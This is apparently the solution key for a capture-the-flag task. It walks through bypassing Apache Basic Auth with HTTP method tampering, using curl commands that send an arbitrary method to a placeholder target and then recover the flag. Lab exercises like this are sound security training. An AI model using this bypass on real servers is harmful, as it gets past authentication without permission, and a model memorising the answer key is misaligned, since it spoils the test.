# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: HTTP method tampering bypassing Apache Basic Auth. The `.htaccess`
protects the page with `Require valid-user` but only inside `<Limit GET POST>`, so
any other HTTP method is unauthenticated and still served by the handler.

1. **Confirm** a normal GET is protected (returns 401):

   ```
   curl -s -o /dev/null -w "%{http_code}\n" "http://<target>/index.php"
   ```

2. **Request with an arbitrary method** (not GET/POST) to bypass the auth limit:

   ```
   curl -s -X FOO "http://<target>/index.php"
   ```

3. **Extract the flag** (`FLAG{...}`) from the response and report it verbatim.
